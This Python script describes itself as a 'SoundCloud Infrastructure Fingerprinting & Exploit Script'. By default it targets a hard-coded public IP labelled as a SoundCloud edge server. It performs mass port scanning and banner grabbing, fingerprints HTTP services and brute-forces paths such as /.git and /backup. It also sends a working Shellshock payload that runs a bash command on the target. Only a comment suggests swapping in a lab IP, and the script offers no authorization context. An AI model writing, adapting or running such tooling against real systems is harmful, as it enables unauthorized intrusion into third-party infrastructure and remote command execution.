# SoundCloud Infrastructure Fingerprinting & Exploit Script
# ---------------------------------------------------------
# This script performs port scanning, banner grabbing, HTTP fingerprinting,
# and checks for common vulnerabilities (Shellshock) against a target IP.

import xml.etree.ElementTree as ET
import socket
import concurrent.futures
import requests
import argparse
import ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target IP address (SoundCloud edge server for example)
default_targets = ["34.213.106.51"]  # Change to your lab IP

# Scan a single TCP port
def scan_port(target, port):
    try:
        sock = socket.socket()
        sock.settimeout(0.5)
        sock.connect((target, port))
        try:
            banner = sock.recv(1024).decode().strip()  # Try to read banner
        except:
            banner = "No banner"
        return (port, True, banner)
    except:
        return (port, False, "")

# HTTP fingerprinting using GET request
def fingerprint_http(target, port, host_header=None):
    try:
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target}:{port}"
        headers = {"Host": host_header} if host_header else None
        r = requests.get(url, timeout=2, headers=headers, verify=False)
        title = r.text.split("<title>")[1].split("</title>")[0] if "<title>" in r.text else "N/A"
        return {
            "port": port,
            "status": r.status_code,
            "title": title,
            "headers": dict(r.headers)
        }
    except Exception as e:
        return {
            "port": port,
            "error": str(e)
        }

# Example call to HTTP fingerprint
fingerprint_http("", 80)

# Test for Shellshock vulnerability on /cgi-bin/status
def exploit_shellshock(target):
    headers = {
        "User-Agent": '() { :; }; echo; echo; /bin/bash -c "id"'
    }
    try:
        r = requests.get(f"http://{target}/cgi-bin/status", headers=headers, timeout=2)
        if "uid=" in r.text:
            print("[+] Shellshock vulnerable! Output:")
            print(r.text)
        else:
            print("[-] Not vulnerable.")
    except Exception as e:
        print("[-] Error:", e)

# Check for common misconfigurations and known CVEs via HTTP headers
def scan_common_vulns(target, port, host_header=None):
    try:
        scheme = "https" if port == 443 else "http"
        url = f"{scheme}://{target}:{port}"
        headers_req = {"Host": host_header} if host_header else None
        r = requests.get(url, timeout=2, headers=headers_req, verify=False)
        headers = r.headers

        issues = []

        # Check for missing security headers
        if "X-Frame-Options" not in headers:
            issues.append("Missing X-Frame-Options (Clickjacking risk)")
        if "X-Content-Type-Options" not in headers:
            issues.append("Missing X-Content-Type-Options (MIME sniffing risk)")
        if "Content-Security-Policy" not in headers:
            issues.append("Missing Content-Security-Policy (XSS risk)")
        if "Strict-Transport-Security" not in headers and port == 443:
            issues.append("Missing HSTS (SSL stripping risk)")

        if issues:
            print(f"[!] {target}:{port} - Potential Issues:")
            for i in issues:
                print(f"  - {i}")
        else:
            print(f"[+] {target}:{port} - No obvious HTTP header issues detected.")
    except Exception as e:
        print(f"[-] Error during vuln scan on {target}:{port} - {e}")


# Parse and display results from a full_scan.xml file (Nmap output)
def parse_nmap_output():
    try:
        tree = ET.parse('full_scan.xml')
        root = tree.getroot()
        for host in root.findall("host"):
            addr = host.find("address").attrib["addr"]
            ports = host.find("ports")
            for port in ports.findall("port"):
                portid = port.attrib["portid"]
                state = port.find("state").attrib["state"]
                if state == "open":
                    print(f"[+] {addr}:{portid} is open")
    except FileNotFoundError:
        print("[-] Skipping XML parsing: 'full_scan.xml' not found.")

def brute_force_paths(target, port, host_header=None):
    wordlist = ["/admin", "/login", "/.git", "/config", "/backup"]
    protocol = "https" if port == 443 else "http"
    base_url = f"{protocol}://{target}:{port}"
    print(f"\n[*] Brute-forcing common paths on {base_url}")
    for path in wordlist:
        try:
            url = base_url + path
            headers = {"Host": host_header} if host_header else None
            r = requests.get(url, timeout=2, headers=headers, verify=False)
            if r.status_code < 400:
                print(f"[+] Found: {url} (Status {r.status_code})")
        except Exception as e:
            pass

def check_tls_config(target, port=443):
    print(f"\n[*] Checking TLS configuration for {target}:{port}")
    try:
        context = ssl._create_unverified_context()
        with socket.create_connection((target, port), timeout=3) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert()
                protocol = ssock.version()
                cipher = ssock.cipher()
                print(f"[+] TLS Version: {protocol}")
                print(f"[+] Cipher: {cipher[0]} ({cipher[1]} bits)")
                print(f"[+] Certificate Subject: {cert.get('subject')}")
    except Exception as e:
        print(f"[-] TLS check failed: {e}")

# Main function with command-line argument handling and structured scan workflow
def main():
    parser = argparse.ArgumentParser(description="Python Port Scanner and Exploiter")
    parser.add_argument("targets", nargs="*", default=["34.213.106.51"], help="Target IP(s) or hostname(s)")
    parser.add_argument("--full", action="store_true", help="Scan all 65535 ports")
    parser.add_argument("--host", help="Override Host header (used for HTTPS SNI and virtual hosts)")
    args = parser.parse_args()

    targets = args.targets
    port_range = range(1, 65536) if args.full else range(1, 1025)
    host_header = args.host

    for target in targets:
        print(f"\n[*] Starting port scan on {target}...")
        open_ports = []

        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
            futures = [executor.submit(scan_port, target, port) for port in port_range]
            for future in concurrent.futures.as_completed(futures):
                port, is_open, banner = future.result()
                if is_open:
                    print(f"[+] Port {port} is open - Banner: {banner}")
                    open_ports.append((port, banner))

        print("\n[*] Starting HTTP fingerprinting...")
        for port, _ in open_ports:
            if port in [80, 443, 8080, 8000]:
                info = fingerprint_http(target, port, host_header=host_header)
                if "error" not in info:
                    print(f"\n[HTTP {info['port']}] Status: {info['status']}")
                    print(f"Title: {info['title']}")
                    print("Headers:")
                    for k, v in info['headers'].items():
                        print(f"  {k}: {v}")
                else:
                    print(f"[-] Port {port} fingerprint error: {info['error']}")

        print("\n[*] Testing for Shellshock...")
        result = exploit_shellshock(target)
        print(result)

        print("\n[*] Scanning for additional HTTP header vulnerabilities...")
        for port, _ in open_ports:
            if port in [80, 443, 8080, 8000]:
                scan_common_vulns(target, port, host_header=host_header)

        print("\n[*] Brute-forcing common directories and files...")
        for port, _ in open_ports:
            if port in [80, 443]:
                brute_force_paths(target, port, host_header=host_header)

        if any(p == 443 for p, _ in open_ports):
            check_tls_config(target, 443)

# Run main() only if executed directly
if __name__ == "__main__":
    parse_nmap_output()
    main()
